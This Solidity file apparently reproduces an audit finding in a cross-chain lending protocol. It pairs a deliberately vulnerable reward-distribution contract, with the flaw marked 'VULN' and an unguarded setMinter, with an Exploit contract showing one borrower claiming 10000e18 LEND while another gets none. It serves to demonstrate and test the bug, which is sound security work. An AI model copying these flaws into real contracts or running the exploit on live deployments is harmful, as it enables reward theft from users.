// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  LEND — H-12 (Sherlock 2025-05, issue 669)
    distributeBorrowerLend sizes the reward from borrowWithInterest, which
    reads crossChainBorrows (originated here) and skips crossChainCollaterals
    (executed here). Bob, who borrowed on the other chain, receives 10000e18
    LEND. Alice, who borrowed here, receives 0.
*/

contract MiniToken {
    string public symbol = "LEND";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    address public minter;

    function setMinter(address m) external {
        minter = m;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }
}

contract LToken {
    function borrowIndex() external pure returns (uint256) {
        return 1e18;
    }
}

contract ExponentialNoError {
    uint256 constant expScale = 1e18;
    uint256 constant doubleScale = 1e36;

    struct Exp {
        uint256 mantissa;
    }

    struct Double {
        uint256 mantissa;
    }

    function add_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function mul_(uint256 a, Double memory b) internal pure returns (uint256) {
        return mul_(a, b.mantissa) / doubleScale;
    }

    function div_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div_(uint256 a, Exp memory b) internal pure returns (uint256) {
        return div_(mul_(a, expScale), b.mantissa);
    }
}

contract LendStorage is ExponentialNoError {
    uint224 public constant LEND_INITIAL_INDEX = 1e36;
    uint256 public constant CURRENT_EID = 1;
    uint256 public constant OTHER_EID = 2;

    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    MiniToken public lend;
    LToken public lToken;
    mapping(address => address) public lTokenToUnderlying;
    mapping(address => mapping(address => Borrow[])) public crossChainBorrows;
    mapping(address => mapping(address => Borrow[])) public crossChainCollaterals;
    mapping(address => uint256) public lendAccrued;
    mapping(address => mapping(address => uint256)) public lendBorrowerIndex;

    constructor(MiniToken lend_, LToken lToken_, address underlying) {
        lend = lend_;
        lToken = lToken_;
        lTokenToUnderlying[address(lToken_)] = underlying;
    }

    function addCrossChainBorrow(address user, address underlying, Borrow memory b) external {
        crossChainBorrows[user][underlying].push(b);
    }

    function addCrossChainCollateral(address user, address underlying, Borrow memory b) external {
        crossChainCollaterals[user][underlying].push(b);
    }

    function triggerBorrowIndexUpdate(address) internal {}

    function lendBorrowState(address) public pure returns (uint224, uint32) {
        return (uint224(2e36), 0);
    }

    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;
        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];
        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == CURRENT_EID) {
                    borrowedAmount += (borrows[i].principle * LToken(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                if (collaterals[i].destEid == CURRENT_EID && collaterals[i].srcEid == CURRENT_EID) {
                    borrowedAmount +=
                        (collaterals[i].principle * LToken(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }

    function borrowWithInterestSame(address, address) public pure returns (uint256) {
        return 0;
    }

    function distributeBorrowerLend(address lToken_, address borrower) external {
        triggerBorrowIndexUpdate(lToken_);
        (uint224 borrowIndex,) = lendBorrowState(lToken_);
        uint256 borrowerIndex = lendBorrowerIndex[lToken_][borrower];
        lendBorrowerIndex[lToken_][borrower] = borrowIndex;
        if (borrowerIndex == 0 && borrowIndex >= LEND_INITIAL_INDEX) {
            borrowerIndex = LEND_INITIAL_INDEX;
        }
        Double memory deltaIndex = Double({mantissa: sub_(borrowIndex, borrowerIndex)});
        uint256 borrowerAmount = div_(add_(borrowWithInterest(borrower, lToken_), borrowWithInterestSame(borrower, lToken_)), Exp({mantissa: LToken(lToken_).borrowIndex()})); // @> VULN: borrowWithInterest counts crossChainBorrows and ignores borrows executed on this chain
        uint256 borrowerDelta = mul_(borrowerAmount, deltaIndex);
        lendAccrued[borrower] = add_(lendAccrued[borrower], borrowerDelta); // STORY: accrue
    }

    function claim(address user) external returns (uint256 amount) {
        amount = lendAccrued[user];
        lendAccrued[user] = 0;
        lend.mint(user, amount); // STORY: mint
    }
}

contract Exploit {
    address public constant ALICE = address(0xA11CE);
    MiniToken public lend;
    LToken public lToken;
    LendStorage public store;
    address public underlying;
    uint256 public bobLend;
    uint256 public aliceLend;

    constructor() {
        lend = new MiniToken();
        lToken = new LToken();
        underlying = address(0xA0);
        store = new LendStorage(lend, lToken, underlying);
        lend.setMinter(address(store));
    }

    function run() external {
        store.addCrossChainBorrow(
            address(this),
            underlying,
            LendStorage.Borrow({
                srcEid: 1,
                destEid: 2,
                principle: 10000e18,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: underlying
            })
        ); // STORY: bob
        store.addCrossChainCollateral(
            ALICE,
            underlying,
            LendStorage.Borrow({
                srcEid: 2,
                destEid: 1,
                principle: 10000e18,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: underlying
            })
        ); // STORY: alice
        store.distributeBorrowerLend(address(lToken), address(this)); // STORY: bob rewards
        store.distributeBorrowerLend(address(lToken), ALICE);
        aliceLend = store.lendAccrued(ALICE);
        bobLend = store.claim(address(this));
        require(bobLend == 10000e18, "bob"); // STORY: harm
        require(aliceLend == 0, "alice");
        require(lend.balanceOf(address(this)) == 10000e18, "bal");
    }
}
